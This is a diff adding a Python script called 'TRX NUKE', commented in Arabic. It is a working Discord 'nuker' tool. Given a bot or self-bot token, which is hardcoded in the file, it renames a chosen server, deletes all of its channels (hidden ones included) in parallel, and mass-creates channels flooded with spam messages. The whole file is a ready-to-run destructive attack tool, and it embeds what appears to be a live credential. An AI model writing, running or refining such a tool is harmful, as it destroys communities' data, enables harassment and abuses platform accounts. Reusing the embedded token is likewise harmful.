@@ -1,0 +1,220 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+TRX NUKE — تحكم كامل بسيرفر ديسكورد
+تثبيت:  pip install aiohttp
+التشغيل: python trx.py
+"""
+
+import asyncio
+import json
+import random
+
+import aiohttp
+
+# ================== الإعدادات ==================
+TOKEN   = "MTU0NTQ1MTUyNzEzNTY5OTAxNA.GcXI8-.WNYC_iq9IuwXSl6I1DyDPkAJNPYlH1AEtRzwA8"   # ← حط التوكن هنا
+IS_BOT  = True              # True =    |   False =TRX جحفله#3949(self-bot)
+WORKERS = 8                 # عدد الطلبات المتزامنة (لا ترفعه كثير عشان الرايت ليمت)
+# ===============================================
+
+API = "https://discord.com/api/v10"
+
+
+def auth_headers():
+    return {
+        "Authorization": f"Bot {TOKEN}" if IS_BOT else TOKEN,
+        "Content-Type": "application/json",
+    }
+
+
+async def api(session, method, path, payload=None, tries=6):
+    """طلب لأي endpoint ديسكورد مع تعامل مع 429 والرايت ليمت."""
+    url = API + path
+    last = None
+    for attempt in range(tries):
+        async with session.request(method, url, json=payload, headers=auth_headers()) as r:
+            status = r.status
+            body = await r.text()
+
+            if status == 429:                     # rate limited
+                try:
+                    wait = float(json.loads(body).get("retry_after", 1.0))
+                except Exception:
+                    wait = 1.0
+                await asyncio.sleep(wait + 0.25)
+                continue
+
+            if status >= 400:
+                last = f"{status} {body[:200]}"
+                await asyncio.sleep(0.4 * (attempt + 1))
+                continue
+
+            if not body:
+                return None
+            try:
+                return json.loads(body)
+            except json.JSONDecodeError:
+                return None
+
+    if last:
+        print(f"\n[!] فشل {method} {path} → {last}")
+    return None
+
+
+def ask_int(prompt, default=1):
+    raw = input(prompt).strip()
+    if raw == "":
+        return default
+    try:
+        return max(0, int(raw))
+    except ValueError:
+        return default
+
+
+# ----------------- اختيار السيرفر -----------------
+async def pick_guild(session):
+    guilds = await api(session, "GET", "/users/@me/guilds") or []
+    if not guilds:
+        print("[!] مافيه سيرفرات ظاهرة لهذا التوكن (تأكد إن البوت داخل السيرفر).")
+        return None
+
+    q = input("اكتب اسم السيرفر (أو ID): ").strip()
+    exact   = [g for g in guilds if g["id"] == q or g["name"].lower() == q.lower()]
+    partial = [g for g in guilds if g["id"] == q or q.lower() in g["name"].lower()]
+    pool = exact or partial
+
+    if not pool:
+        print("[!] مالقيت السيرفر. المتاح:")
+        for g in guilds:
+            print(f"    - {g['name']}  ({g['id']})")
+        return None
+
+    if len(pool) == 1:
+        return pool[0]
+
+    print("أكثر من سيرفر مطابق، اختر رقم:")
+    for i, g in enumerate(pool, 1):
+        print(f"  [{i}] {g['name']}  ({g['id']})")
+    try:
+        return pool[int(input("رقم: ").strip()) - 1]
+    except Exception:
+        return None
+
+
+# ----------------- العمليات -----------------
+async def rename_guild(session, gid):
+    new_name = input("الاسم الجديد للسيرفر: ").strip()
+    if not new_name:
+        print("[!] اسم فاضي، ملغي.")
+        return
+    res = await api(session, "PATCH", f"/guilds/{gid}", {"name": new_name})
+    print(f"[✓] تم تغيير اسم السيرفر إلى: {new_name}" if res else "[!] فشل التغيير (تحتاج صلاحية Manage Server).")
+
+
+async def get_channels(session, gid):
+    return await api(session, "GET", f"/guilds/{gid}/channels") or []
+
+
+async def delete_channels(session, gid):
+    chans = await get_channels(session, gid)
+    total = len(chans)
+    n = ask_int(f"كم روم تحذف؟ (الموجود {total} — اكتب 0 أو Enter = الكل): ", default=0)
+    if n == 0 or n > total:
+        n = total
+
+    random.shuffle(chans)
+    targets = chans[:n]
+    sem = asyncio.Semaphore(WORKERS)
+    done = 0
+
+    async def kill(c):
+        nonlocal done
+        async with sem:
+            await api(session, "DELETE", f"/channels/{c['id']}")
+            done += 1
+            print(f"\r    حذف {done}/{len(targets)} روم ...", end="", flush=True)
+
+    await asyncio.gather(*(kill(c) for c in targets))
+    print(f"\n[✓] تم حذف {done} روم (المخفي والظاهر).")
+
+
+async def spam_create_and_message(session, gid):
+    ch_name  = input("اسم الروم: ").strip() or "trx"
+    ch_count = ask_int("كم روم تنشئ؟ ", default=5)
+    message  = input("نص الرسالة: ").strip() or "TRX"
+    msg_count = ask_int("كم رسالة في كل روم؟ ", default=5)
+
+    sem = asyncio.Semaphore(WORKERS)
+    created = 0
+
+    async def worker(i):
+        nonlocal created
+        async with sem:
+            ch = await api(session, "POST", f"/guilds/{gid}/channels",
+                           {"name": ch_name, "type": 0})
+        if not ch:
+            return
+        cid = ch["id"]
+        created += 1
+        print(f"\r    منشأة {created}/{ch_count} روم ...", end="", flush=True)
+
+        for _ in range(msg_count):
+            await api(session, "POST", f"/channels/{cid}/messages", {"content": message})
+
+    await asyncio.gather(*(worker(i) for i in range(ch_count)))
+    print(f"\n[✓] تم إنشاء {created} روم وإرسال {created * msg_count} رسالة.")
+
+
+# ----------------- البرنامج الرئيسي -----------------
+async def main():
+    if "ضع_" in TOKEN:
+        print("[!] حط التوكن في المتغير TOKEN فوق أول.")
+        return
+
+    timeout = aiohttp.ClientTimeout(total=60)
+    connector = aiohttp.TCPConnector(limit=WORKERS * 3)
+
+    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+        me = await api(session, "GET", "/users/@me")
+        if not me:
+            print("[!] التوكن غلط أو منتهي.")
+            return
+        print(f"[+] متصل كـ: {me.get('username')}#{me.get('discriminator', '0')}")
+
+        guild = await pick_guild(session)
+        if not guild:
+            return
+        gid = guild["id"]
+        print(f"[+] السيرفر: {guild['name']}  ({gid})")
+
+        if input("اكتب TRX للتأكيد: ").strip() != "TRX":
+            print("[!] تأكيد خاطئ، خروج.")
+            return
+
+        while True:
+            print("""
+=========================================
+  [1] تغيير اسم السيرفر
+  [2] حذف رومات (المخفي والظاهر)
+  [3] سبام إنشاء رومات + سبام رسائل
+  [0] خروج
+=========================================""")
+            choice = input("اختر: ").strip()
+
+            if choice == "1":
+                await rename_guild(session, gid)
+            elif choice == "2":
+                await delete_channels(session, gid)
+            elif choice == "3":
+                await spam_create_and_message(session, gid)
+            elif choice == "0":
+                print("[+] خلصنا.")
+                return
+
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] إيقاف يدوي.")
